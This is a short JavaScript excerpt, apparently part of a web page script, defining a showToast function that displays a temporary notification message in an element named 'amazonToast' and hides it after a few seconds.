//  7. TOAST NOTIFICATION
// ==========================================================================
function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.style.display = "none", 300);
  }, 3500);
}
